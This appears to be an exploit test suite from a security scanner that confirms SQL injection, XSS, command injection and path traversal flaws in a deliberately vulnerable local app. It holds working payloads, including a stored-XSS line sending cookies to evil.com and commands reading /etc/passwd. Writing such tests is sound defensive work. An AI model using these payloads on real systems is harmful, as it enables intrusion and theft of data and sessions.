/**
 * Exploit Tests for Vulnerable App
 * 
 * These tests PROVE the vulnerabilities exist by exploiting them.
 * This is what Pinata's --execute mode generates and runs.
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import request from "supertest";
import { app } from "./server.js";

describe("SQL Injection Exploits", () => {
  describe("string concatenation injection", () => {
    it("exploit: OR 1=1 returns all users", async () => {
      const payload = "1 OR 1=1";
      const response = await request(app).get(`/api/users/${payload}`);
      
      expect(response.status).toBe(200);
      expect(response.body.results.length).toBeGreaterThan(1);
      // Should return all users, not just one
      expect(response.body.results.length).toBe(3);
    });

    it("exploit: UNION attack extracts data", async () => {
      const payload = "1 UNION SELECT * FROM admin_users--";
      const response = await request(app).get(`/api/users/${payload}`);
      
      expect(response.status).toBe(200);
      expect(response.body.results.length).toBeGreaterThan(1);
    });

    it("exploit: comment termination bypasses filters", async () => {
      const payload = "1--";
      const response = await request(app).get(`/api/users/${payload}`);
      
      expect(response.status).toBe(200);
      expect(response.body.query).toContain("--");
    });
  });

  describe("boolean blind injection", () => {
    it("exploit: true condition returns data", async () => {
      // Payload ends with quote to form valid SQL: WHERE id = '1' AND '1'='1'
      const payload = encodeURIComponent("1' AND '1'='1'--");
      const response = await request(app).get(`/api/users/check/${payload}`);
      
      expect(response.status).toBe(200);
      expect(response.body.exists).toBe(true);
      expect(response.body.count).toBeGreaterThan(0);
    });

    it("exploit: false condition returns no data", async () => {
      // Payload: WHERE id = '1' AND '1'='2'--
      const payload = encodeURIComponent("1' AND '1'='2'--");
      const response = await request(app).get(`/api/users/check/${payload}`);
      
      expect(response.status).toBe(200);
      expect(response.body.exists).toBe(false);
      expect(response.body.count).toBe(0);
    });

    it("exploit: differential confirms injection", async () => {
      const truePayload = encodeURIComponent("1' AND '1'='1'--");
      const falsePayload = encodeURIComponent("1' AND '1'='2'--");
      
      const trueResponse = await request(app).get(`/api/users/check/${truePayload}`);
      const falseResponse = await request(app).get(`/api/users/check/${falsePayload}`);
      
      // Different results = injectable
      expect(trueResponse.body.count).not.toBe(falseResponse.body.count);
    });
  });
});

describe("XSS Exploits", () => {
  it("exploit: script tag injection", async () => {
    const payload = '<script>alert("XSS")</script>';
    const response = await request(app).get(`/search?q=${encodeURIComponent(payload)}`);
    
    expect(response.status).toBe(200);
    // Payload should appear unescaped in response
    expect(response.text).toContain('<script>alert("XSS")</script>');
  });

  it("exploit: img onerror injection", async () => {
    const payload = '<img src=x onerror=alert("XSS")>';
    const response = await request(app).get(`/search?q=${encodeURIComponent(payload)}`);
    
    expect(response.status).toBe(200);
    expect(response.text).toContain('onerror=alert');
  });

  it("exploit: stored XSS via comments", async () => {
    const payload = '<script>document.location="http://evil.com?c="+document.cookie</script>';
    
    // Store malicious comment
    const postResponse = await request(app)
      .post("/api/comments")
      .send({ comment: payload });
    
    expect(postResponse.status).toBe(200);
    
    // Retrieve and verify it's stored unescaped
    const getResponse = await request(app).get("/api/comments");
    expect(getResponse.body.comments).toContain(payload);
  });
});

describe("Command Injection Exploits", () => {
  it("exploit: semicolon command chaining", async () => {
    const payload = "localhost; cat /etc/passwd";
    const response = await request(app).get(`/api/ping?host=${encodeURIComponent(payload)}`);
    
    expect(response.status).toBe(200);
    expect(response.body.injected).toBe(true);
    expect(response.body.command).toContain(";");
  });

  it("exploit: pipe command chaining", async () => {
    const payload = "localhost | whoami";
    const response = await request(app).get(`/api/ping?host=${encodeURIComponent(payload)}`);
    
    expect(response.status).toBe(200);
    expect(response.body.injected).toBe(true);
  });

  it("exploit: backtick command substitution", async () => {
    const payload = "`id`";
    const response = await request(app).get(`/api/ping?host=${encodeURIComponent(payload)}`);
    
    expect(response.status).toBe(200);
    expect(response.body.injected).toBe(true);
  });

  it("exploit: $() command substitution", async () => {
    const payload = "$(whoami)";
    const response = await request(app).get(`/api/ping?host=${encodeURIComponent(payload)}`);
    
    expect(response.status).toBe(200);
    expect(response.body.injected).toBe(true);
  });
});

describe("Path Traversal Exploits", () => {
  it("exploit: basic ../ traversal", async () => {
    const payload = "../../../etc/passwd";
    const response = await request(app).get(`/api/files/${encodeURIComponent(payload)}`);
    
    expect(response.status).toBe(200);
    expect(response.body.traversal).toBe(true);
    expect(response.body.content).toContain("SENSITIVE");
  });

  it("exploit: URL encoded traversal", async () => {
    const payload = "..%2F..%2F..%2Fetc%2Fpasswd";
    const response = await request(app).get(`/api/files/${payload}`);
    
    // After URL decoding by Express
    expect(response.status).toBe(200);
  });

  it("exploit: windows style traversal", async () => {
    const payload = "..\\..\\..\\etc\\passwd";
    const response = await request(app).get(`/api/files/${encodeURIComponent(payload)}`);
    
    expect(response.status).toBe(200);
    expect(response.body.traversal).toBe(true);
  });
});
